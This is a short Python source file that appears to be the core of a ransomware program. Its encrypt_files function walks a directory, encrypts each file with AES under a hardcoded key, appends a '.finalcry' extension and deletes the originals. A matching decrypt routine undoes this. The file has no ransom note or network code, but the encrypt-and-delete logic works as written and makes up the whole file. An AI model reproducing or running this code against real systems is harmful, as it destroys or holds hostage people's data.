import os, random, base64
import get_files
import pyAesCrypt

# encryption/decryption buffer size - 64K
bufferSize = 64 * 1024
# encrypt
# pyAesCrypt.encryptFile("data.txt", "data.txt.aes", password, bufferSize)
## decrypt
# pyAesCrypt.decryptFile("data.txt.aes", "dataout.txt", password, bufferSize)
key = "foopassword"


def encrypt_files(path, key):
    files = get_files.find_files(path)
    for file in files:
        pyAesCrypt.encryptFile(file, file + ".finalcry", key, bufferSize)
        os.remove(file)


def decrypt_files(path, key):
    files = get_files.find_encrypted(path)
    for file in files:
        pyAesCrypt.decryptFile(file, file.replace(".finalcry", ""), key, bufferSize)
        os.remove(file)

